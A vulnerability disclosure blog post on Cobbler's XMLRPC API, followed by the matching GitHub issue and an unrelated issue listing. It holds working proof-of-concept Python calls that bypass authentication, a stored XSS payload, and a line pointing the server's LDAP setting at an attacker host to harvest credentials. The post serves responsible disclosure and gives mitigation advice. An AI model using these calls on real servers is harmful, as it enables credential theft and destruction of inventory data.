=== Content from movermeyer.com_99259d87_20250125_011517.html ===

[Michael's Blog](https://movermeyer.com/)

* [About Me](/aboutme)
* [Open Source](/open-source)
* Search

[![Navigation bar avatar](/assets/img/avatar-icon.jpg)](https://movermeyer.com/)

✕

# Privilege Escalation Exploits in Cobbler's API

Posted on August 2, 2018

**TL;DR:** There are several privilege escalation vulnerabilities in Cobbler’s XMLRPC API. There are also many endpoints that are not validating the auth tokens passed to them. As a result, the API is effectively unauthenticated. Consider using a firewall to restrict access to the `/cobbler_api` endpoint.

# Introduction

[Cobbler](https://cobbler.github.io/) is an infrastructure configuration management tool. It is [used by many large organizations](https://cobbler.github.io/users.html) to provision and track their inventories of virtual machines.

From the website:

> Cobbler can help with provisioning, managing DNS and DHCP, package updates, power management, configuration management orchestration, and much more.

# The Story

Back in May 2017, I was working on an in-house automated machine provisioning system. It combined [Ansible](https://docs.ansible.com/ansible/latest/index.html), [VMWare vCenter](https://www.vmware.com/products/vcenter-server.html), [Cobbler](https://cobbler.github.io/), and [HashiCorp Vault](https://www.vaultproject.io/) together to make provisioning virtual machines easy, while also allowing for the entire configuration to be stored as code (ie. [“Infrastructure as Code”](https://en.wikipedia.org/wiki/Infrastructure_as_Code)).

I was trying to make use of Cobbler’s XMLRPC API, but I was having troubles since it was not well documented.
The next step was to look at the code to see how the API is implemented.

Cobbler is making use of Python’s built-in [`SimpleXMLRPCServer`](https://docs.python.org/2/library/simplexmlrpcserver.html) and is using the [`register_instance`](https://docs.python.org/2/library/simplexmlrpcserver.html#SimpleXMLRPCServer.SimpleXMLRPCServer.register_instance) method. This effectively exposes all of the methods of the [`CobblerXMLRPCInterface` class](https://github.com/cobbler/cobbler/blob/fe8cd399140e155d7bbf9111a2272653b22725f2/cobbler/remote.py#L101) as endpoints of the API.

*And boy does the `CobblerXMLRPCInterface` class ever have a lot of methods…*

195 of them. Including these curious “private” methods:

* `_new_event(self, name)`
* `_set_task_state(self, thread_obj, event_id, new_state)`
* `_log(self, msg, user=None, name=None, object_id=None, attribute=None, debug=False, error=False)`

These caught my eye as they probably weren’t intended to be exposed and didn’t require a security token to call.

# The [First] Exploit

Let’s try calling one just to see what happens.

```
import xmlrpc.client

cobbler_connection = xmlrpc.client.ServerProxy("http://127.0.0.1/cobbler_api", allow_none=True)
try:
    cobbler_connection._new_event('Hello!')
except xmlrpc.client.Fault: #_new_event() returns None, which causes Cobbler's response renderer to fail
    pass

```

As you might guess, this creates an “Event” with the name ‘Hello!’ which can be seen in the UI at `https://127.0.0.1/cobbler_web/events`

![The event displayed in the Cobbler Web UI](/assets/img/cobbler_hello_event.png)

So I had a way to create objects in Cobbler using an unauthenticated endpoint. From an attacker’s perspective, this is a good start. What could I do with it?

What happens if I pass in some HTML + JavaScript?:

```
payload = """
<button onclick="myFunction()">Click me!</button>

<script>
function myFunction() {
    alert("Hah! you clicked!");
}
</script>
"""

cobbler_connection._new_event(payload)

```

![The event displayed in the Cobbler Web UI showing that the HTML is rendered and the JavaScript executed](/assets/img/cobbler_js_event.png)

Yup. It renders it and executes the JavaScript. :smile:

So now I can execute arbitrary JavaScript once a user visits the Events page. This is a [Persistent XSS](https://en.wikipedia.org/wiki/Cross-site_scripting#Persistent_(or_stored)) vulnerability.

(Aside: this can also be done by injecting the payload into the ‘State’ attribute of the event using the `_set_task_state` endpoint)

Even better (from an attacker’s perspective), when an event is created, anyone logged into the Cobbler UI at the time receives a notification popup which renders the Event:

![The event displayed in the Cobbler Web UI notification popup](/assets/img/cobbler_event_popup.png)

This means that even if a user doesn’t visit the Events page, I can execute arbitrary JavaScript.
Of course, being arbitrary JavaScript, I can edit the DOM to hide the popup from ever appearing, as well as hijack the user’s session to perform authenticated requests on their behalf. Privilege escalation FTW!

# Making a Proof of Concept

In order to be able to provide a compelling proof-of-concept, I then began looking for a way to do something destructive with this ability. I settled on the idea of deleting the “system” records tracked in Cobbler. This would essentially delete everything Cobbler knows about from its database, meaning that the organization would likely have to restore from backups in order to get that information back.

There is an endpoint that allows you to delete system records, but for that you need to know the names of the systems that you want to delete.

If the user whose session I hijacked was on the “Systems” page when the event popup was rendered, I could scrape the DOM for system names, but that is limited to the first 50 systems that are visible before pagination happens.

I wanted a way to get access to all the system names. That would allow me to then hijack their session and perform a call to `/cobbler_web/system/multi/delete/delete`, deleting all their system records in one fell swoop.

Looking through the API signatures, I found that the `get_systems` call requires an auth token:

`get_systems(self, token, page=None, results_per_page=None, **rest)`

While I had control of a user’s session, I didn’t directly have their auth token.

But while looking at the other endpoints, I noticed there is a similarly named endpoint that doesn’t require an auth token:

`get_systems_since(self, mtime)`

By setting `mtime` to 0, we get:

```
    systems = cobbler_connection.get_systems_since(0)
    print(systems)

```

Which gives us the full list of systems.

Bingo! I had everything I needed. After some mucking around with JavaScript, I had created an exploit that would delete all the systems in any exposed Cobbler server, without having to authenticate.

A more experience JavaScript developer or security researcher could likely devise a more sinister payload, but I feel this is good enough for a PoC exploit.

Not bad for a couple of hours of play. :smile:

I then went looking at the rest of the API more closely…

# Wait, what?

It turns out that the `get_systems` call I avoided using before (because of the `token` parameter) doesn’t actually use the `token` parameter (I slightly changed the method signature in the above example in order to not spoil the surprise):

```
def get_systems(self, page=None, results_per_page=None, token=None, **rest):
    return self.get_items("system")

```

:question::exclamation::question:

So I could simply pass in anything (or nothing) and get the same effect:

```
    systems = cobbler_connection.get_systems(None, None, 'totally_a_secure_token')
    print(systems)

```

I wondered if there were any other endpoints that had this same issue.

Doing some quick-and-dirty [AST parse magic](https://docs.python.org/2/library/ast.html), I discovered that there are no fewer than 70 other endpoints that require an auth token but don’t actually use it!

![Captain Jean-Luc Picard of the USS Enterprise, facepalming](/assets/img/Picard-Facepalm.jpg)

At a glance, some interesting ones include:

* `rename_*`
* `run_install_triggers`
* `upload_log_data`
* `disable_netboot`

Some of these have some additional security, since they were recognized as especially dangerous. Before they can be used, they must be first enabled in the `/etc/cobbler/settings` file.

For example, from [`/etc/cobbler/settings`](https://github.com/cobbler/cobbler/blob/650e4226e31613c9a6fda024da9b1df24d27fc95/config/cobbler/settings#L32):

```
# NOTE: This does allow an xmlrpc call to send logs
# to this directory, without authentication, so enable only if you are
# ok with this limitation.
anamon_enabled: 0

```

However, authenticated users can also change this setting in an already running server using the `modify_setting` endpoint:

`modify_setting(self, setting_name, value, token)`

Again, the actual implementation of the endpoint never validates the value of the `token` parameter, so any value works.

```
cobbler_connection.modify_setting('anamon_enabled', '1', 'bogus_token')

```

So it doesn’t matter whether the server operator is “ok with this limitation”, since unauthenticated users can change the value at any time. :stuck\_out\_tongue:

# More privilege escalation

Another interesting setting in the `/etc/cobbler/settings` file is `ldap_server`, which specifies the LDAP server to authenticate against.

For Cobbler servers that are configured to authenticate against an LDAP server (likely all large corporation deployments), an attacker could set up their own LDAP server and use this improperly secured endpoint to get the Cobbler server to authenticate against it.

```
cobbler_connection.modify_setting('ldap_server', 'my-evil-ldap-server.example.com', 'bogus_token')

```

The attacker can then use their server to collect user credentials, gaining all the privileges of those users, for all systems that are connected to the organization’s LDAP server.

This is a ‘loud’ attack because already logged in users will have their login session interrupted. But even if the ability to login was disrupted and reported to system administrators, the changes to the settings are entirely in-memory and are wiped out upon restart of the Cobbler server.
Only the most paranoid sysadmins are likely to dig further if the problem resolves itself on restart. “Must have just lost its connection to the LDAP server for some reason” is an all too common problem in their field.

Aside: If an attacker were to do this attack, it would likely be done when they are confident no one will be logged into the system (ex. 23:00 Saturday, when the office is closed for the weekend).

(There are many more settings that can be tampered with. The full can be seen at `/cobbler_web/setting/list` or in [the source](https://github.com/cobbler/cobbler/blob/650e4226e31613c9a6fda024da9b1df24d27fc95/config/cobbler/settings).)

# Conclusions

These are just the vulnerabilities I discovered. I have no doubts that there are numerous other ways that the Cobbler API can be abused for nefarious purposes. The API is essentially unauthenticated, and its power is almost unlimited.

Ironically, if there had been good documentation of the API, I would have never looked at the code itself, and never discovered these problems.

If you are using Cobbler today, make sure that it is not exposed to the Internet. Beyond that, recognize that if an attacker were to gain a foothold in your network, that your Cobbler server is an attractive next target, given the information that can be gleaned from it. Consider configuring a firewall to restrict or disallow access to the `/cobbler_api` endpoint.

Finally, Cobbler has been graciously maintained by one person in their (limited) spare time. However, they are [now looking for maintainers](https://github.com/cobbler/cobbler/issues/1892) to keep the project going. Fixing these vulnerabilities will take a sizeable, dedicated effort. If you are using Cobbler as part of your infrastructure today, consider contributing some of your engineering talent’s time to getting these issues fixed so that the entire community can continue to use this tool safely.

# Response

## Affected versions

These vulnerabilities are verified as present in Cobbler versions 2.6.11+, but code inspection suggests at least 2.0.0+ or possibly even older versions may be vulnerable.

## GitHub Issues

* Persistent XSS: https://github.com/cobbler/cobbler/issues/1917
* Incorrect Authentication: https://github.com/cobbler/cobbler/issues/1916

## CVE Numbers

CVE numbers are in the process of be applied for. This page will be updated with the numbers when they are issued.

* [CVE-2018-10931](https://nvd.nist.gov/vuln/detail/CVE-2018-10931) was assigned to address the inadvertently exposed `_*` endpoints.
* [CVE-2018-1000225](https://nvd.nist.gov/vuln/detail/CVE-2018-1000225) was assigned to address the Persistent XSS vulnerability.
* [CVE-2018-1000226](https://nvd.nist.gov/vuln/detail/CVE-2018-1000226) was assigned to address the multiple incorrect access control vulnerabilities in the API.

# Responsible Disclosure Timeline

* 2017-05-18: Reached out via email to Jörgen Mass (primary contributor).
* 2017-05-23: Reply from Jörgen.
* 2017-05-23: Sent explanation of the exploits to Jörgen.
* 2017-06-01: Confirmation of receipt from Jörgen.
* 2017-06-28: Confirmation of exploits by Jörgen.
* …
* 2018-04-16: Nearly 10 months later, no fixes made, nor users notified. Sent follow-up email to Jörgen.
* 2018-05-02: After no response, sent email informing Jörgen of my intentions to publicly disclose after 90 days.
* 2018-08-02: Public disclosure of exploits (92 days).

[![](/assets/img/avatar-icon.jpg)](https://movermeyer.com )

Michael Overmeyer is a Software Developer, currently at Shopify.
[Follow him on Twitter](https://twitter.com/movermeyer).

Share:
[Twitter](https://twitter.com/intent/tweet?text=Privilege+Escalation+Exploits+in+Cobbler%27s+API&url=https%3A%2F%2Fmovermeyer.com%2F2018-08-02-privilege-escalation-exploits-in-cobblers-api%2F "Share on Twitter")
[Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmovermeyer.com%2F2018-08-02-privilege-escalation-exploits-in-cobblers-api%2F "Share on Facebook")
[LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmovermeyer.com%2F2018-08-02-privilege-escalation-exploits-in-cobblers-api%2F "Share on LinkedIn")

* [← Previous Post](/2018-06-22-readme-badges-are-vulns/ "README badges are vulnerabilities")
* [Next Post →](/2022-02-05-genmitsu-sainsmart-3018-prover-debugging/ "Genmitsu Sainsmart 3018 PROver CNC debugging")

* [GitHub](https://github.com/movermeyer "GitHub")
* [GitLab](https://gitlab.com/movermeyer "GitLab")
* [Bitbucket](https://bitbucket.org/movermeyer "Bitbucket")
* [LinkedIn](https://linkedin.com/in/movermeyer "LinkedIn")
* [StackOverflow](https://stackoverflow.com/users/6460914/movermeyer "StackOverflow")

2023
 •
[movermeyer.com](https://movermeyer.com/)

 •
[Edit page](https://github.com/movermeyer/movermeyer.github.io/edit/main/_posts/2018-08-03-privilege-escalation-exploits-in-cobblers-api.md "Edit this page on GitHub")

Powered by
[Beautiful Jekyll](https://beautifuljekyll.com)



=== Content from github.com_a147e907_20250126_050003.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcobbler%2Fcobbler%2Fissues%3Fq%3Dstate%253Aopen%2520label%253A%2522Bug%2520Report%2522)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

state:open label:"Bug Report"

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcobbler%2Fcobbler%2Fissues%3Fq%3Dstate%253Aopen%2520label%253A%2522Bug%2520Report%2522)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fissues%2Findex&source=header-repo&source_repo=cobbler%2Fcobbler)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cobbler](/cobbler)
/
**[cobbler](/cobbler/cobbler)**
Public

* [Notifications](/login?return_to=%2Fcobbler%2Fcobbler) You must be signed in to change notification settings
* [Fork
  652](/login?return_to=%2Fcobbler%2Fcobbler)
* [Star
   2.6k](/login?return_to=%2Fcobbler%2Fcobbler)

* [Code](/cobbler/cobbler)
* [Issues
  315](/cobbler/cobbler/issues)
* [Pull requests
  14](/cobbler/cobbler/pulls)
* [Discussions](/cobbler/cobbler/discussions)
* [Actions](/cobbler/cobbler/actions)
* [Projects
  1](/cobbler/cobbler/projects)
* [Wiki](/cobbler/cobbler/wiki)
* [Security](/cobbler/cobbler/security)
* [Insights](/cobbler/cobbler/pulse)

Additional navigation options

* [Code](/cobbler/cobbler)
* [Issues](/cobbler/cobbler/issues)
* [Pull requests](/cobbler/cobbler/pulls)
* [Discussions](/cobbler/cobbler/discussions)
* [Actions](/cobbler/cobbler/actions)
* [Projects](/cobbler/cobbler/projects)
* [Wiki](/cobbler/cobbler/wiki)
* [Security](/cobbler/cobbler/security)
* [Insights](/cobbler/cobbler/pulse)

Preview
# Issues

Search Issuesstate:open label:"Bug Report"Search

[Labels](labels)[Milestones](milestones)[New issue](/login?return_to=)
## Search results

OpenClosedAuthorLabelsProjectsMilestonesAssigneesTypesNewest

* ### [mkloaders fails to link shim.efi on system with UEFI boot and SElinux enabled](/cobbler/cobbler/issues/3878)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3878 In cobbler/cobbler;· [bruncsak](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Abruncsak)  opened on Jan 16, 2025
* ### [nopxe API logs an error if manage\_dhcp is set to false](/cobbler/cobbler/issues/3877)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3877 In cobbler/cobbler;· [olafhering](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Aolafhering)  opened on Jan 15, 2025
* ### [It is a totally disaster version from cobbler v3.0.0](/cobbler/cobbler/issues/3876)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bug[Good first issueGood for newcomers](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Good%20first%20issue%22)Good for newcomersStatus: Open.#3876 In cobbler/cobbler;· [liangtiansheng](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Aliangtiansheng)  opened on Jan 10, 2025
* ### [Index profile.arch is not usable](/cobbler/cobbler/issues/3874)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3874 In cobbler/cobbler;· [tpw56j](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Atpw56j)  opened on Jan 4, 2025
* ### [Exception value: 'str' object has no attribute 'copy'](/cobbler/cobbler/issues/3873)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3873 In cobbler/cobbler;· [sergey-ganchuk](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Asergey-ganchuk)  opened on Dec 30, 2024
* ### [Owners field blows up](/cobbler/cobbler/issues/3872)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3872 In cobbler/cobbler;· [sergey-ganchuk](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Asergey-ganchuk)  opened on Dec 30, 2024
* ### [cobbler gets into endless loop with rotated logfile](/cobbler/cobbler/issues/3866)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3866 In cobbler/cobbler;· [olafhering](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Aolafhering)  opened on Dec 16, 2024
* ### [UEFI Boot Installation Fails with Cobbler on Ubuntu 16.04.7 — Enters GRUB Shell](/cobbler/cobbler/issues/3862)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3862 In cobbler/cobbler;· [helloxjade](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Ahelloxjade)  opened on Nov 28, 2024
* ### [cobbler 3.3.7 run signature update exception](/cobbler/cobbler/issues/3861)

  [Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3861 In cobbler/cobbler;· [ljhmily](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3Aljhmily)  opened on Nov 25, 2024
* ### [Automatic creation of the release failed](/cobbler/cobbler/issues/3857)

  [3.3.7Release 3.3.7](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A3.3.7)Release 3.3.7[Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bug[CICI/CD related](/cobbler/cobbler/issues?q=state%3Aopen%20label%3ACI)CI/CD relatedStatus: Open.#3857 In cobbler/cobbler;· [SchoolGuy](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3ASchoolGuy)  opened on Nov 17, 2024
* ### [Upload to PyPi wasn't successful for 3.2.3 tag](/cobbler/cobbler/issues/3856)

  [3.2.3Release 3.2.3](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A3.2.3)Release 3.2.3[Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bug[CICI/CD related](/cobbler/cobbler/issues?q=state%3Aopen%20label%3ACI)CI/CD relatedStatus: Open.#3856 In cobbler/cobbler;· [SchoolGuy](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3ASchoolGuy)  opened on Nov 17, 2024 · [3.2.4](https://github.com/cobbler/cobbler/milestone/25)
* ### [Version number isn't correct for 3.2.3](/cobbler/cobbler/issues/3855)

  [3.2.3Release 3.2.3](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A3.2.3)Release 3.2.3[Bug ReportReporting a bug](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bugStatus: Open.#3855 In cobbler/cobbler;· [SchoolGuy](/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22%20author%3ASchoolGuy)  opened on Nov 17, 2024 · [3.2.4](https://github.com/cobbler/cobbler/milestone/25)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2b159ab3_20250125_011516.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcobbler%2Fcobbler%2Fissues%2F1916)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcobbler%2Fcobbler%2Fissues%2F1916)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cobbler%2Fcobbler)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cobbler](/cobbler)
/
**[cobbler](/cobbler/cobbler)**
Public

* [Notifications](/login?return_to=%2Fcobbler%2Fcobbler) You must be signed in to change notification settings
* [Fork
  652](/login?return_to=%2Fcobbler%2Fcobbler)
* [Star
   2.6k](/login?return_to=%2Fcobbler%2Fcobbler)

* [Code](/cobbler/cobbler)
* [Issues
  315](/cobbler/cobbler/issues)
* [Pull requests
  14](/cobbler/cobbler/pulls)
* [Discussions](/cobbler/cobbler/discussions)
* [Actions](/cobbler/cobbler/actions)
* [Projects
  1](/cobbler/cobbler/projects)
* [Wiki](/cobbler/cobbler/wiki)
* [Security](/cobbler/cobbler/security)
* [Insights](/cobbler/cobbler/pulse)

Additional navigation options

* [Code](/cobbler/cobbler)
* [Issues](/cobbler/cobbler/issues)
* [Pull requests](/cobbler/cobbler/pulls)
* [Discussions](/cobbler/cobbler/discussions)
* [Actions](/cobbler/cobbler/actions)
* [Projects](/cobbler/cobbler/projects)
* [Wiki](/cobbler/cobbler/wiki)
* [Security](/cobbler/cobbler/security)
* [Insights](/cobbler/cobbler/pulse)

# Many XMLRPC API endpoints are not correctly validating security tokens [CVE-2018-1000226] #1916

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Many XMLRPC API endpoints are not correctly validating security tokens [CVE-2018-1000226]](#top)#1916Copy linkLabels[Bug ReportReporting a bug](https://github.com/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Bug%20Report%22)Reporting a bug[PriorityIssues that will be worked on with higher priority.](https://github.com/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Priority%22)Issues that will be worked on with higher priority.[Security](https://github.com/cobbler/cobbler/issues?q=state%3Aopen%20label%3A%22Security%22)[![@movermeyer](https://avatars.githubusercontent.com/u/1459385?v=4&size=80)](/movermeyer)
## Description

[![@movermeyer](https://avatars.githubusercontent.com/u/1459385?v=4&size=48)](/movermeyer)[movermeyer](https://github.com/movermeyer)opened [on Aug 2, 2018](https://github.com/cobbler/cobbler/issues/1916#issue-347048979)

Looking at Cobbler's XMLRPC API, there are many places where the user supplied security token is not being correctly validated, effectively resulting in authentication being bypassed.

Using some quick-and-dirty [AST parse magic](https://docs.python.org/2/library/ast.html), I discovered that there are no fewer than 70 other endpoints that require an security token but don't actually use it!

This means that unauthenticated users are able to perform all sorts of actions that they should not be able to.

# Example

For example, the `upload_log_data` endpoint allows users to upload files to the server. As this is a dangerous action, there is a flag in `/etc/cobbler/settings` that must be explicitly enabled before this functionality becomes available:

From [`/etc/cobbler/settings`](https://github.com/cobbler/cobbler/blob/650e4226e31613c9a6fda024da9b1df24d27fc95/config/cobbler/settings#L32):

```
# NOTE: This does allow an xmlrpc call to send logs
# to this directory, without authentication, so enable only if you are
# ok with this limitation.
anamon_enabled: 0
```

However, authenticated users can also change this setting in a running server using the `modify_setting` endpoint in the XMLRPC API.

`modify_setting(self, setting_name, value, token)`

But the actual implementation of the endpoint never validates the value of the `token` parameter, so any value works:

```
# Python 2.7

import base64
from xmlrpclib import ServerProxy

cobbler_connection = ServerProxy("http://192.168.0.244/cobbler_api", allow_none=True)

name = "greeting.txt"
payload = b"Hello!"
data = base64.encodestring(payload)

# Try to upload logs with anamon_enabled = 0. Fails and returns False.
assert cobbler_connection.upload_log_data('sysname', name, len(payload), 0, data) == False

# Change the anamon_enabled setting, using a fake security token.
cobbler_connection.modify_setting('anamon_enabled', '1', 'bogus_token')

# Try again. This time it works.
assert cobbler_connection.upload_log_data('sysname', name, len(payload), 0, data) == True
```

So it doesn't matter whether the server operator is "ok with this limitation", since unauthenticated users can change the value at any time.

# Conclusion

There are many other potentially harmful endpoints in the API, and many more creative ways to exploit them.

